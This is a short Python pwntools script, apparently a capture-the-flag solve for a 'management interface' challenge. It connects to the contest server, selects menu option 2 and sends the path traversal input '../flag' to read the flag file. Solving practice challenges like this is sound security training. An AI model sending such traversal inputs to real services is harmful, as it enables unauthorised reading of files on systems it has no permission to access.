!/usr/bin/python
from pwn import *
context.log_level = 'critical'

host,port = 'mngmnt-iface.ctfcompetition.com',1337
r = remote(host, port)

r.recv(); r.recv()
r.sendline('2')
r.recv(); r.recv()
r.sendline('../flag')
print r.recv()
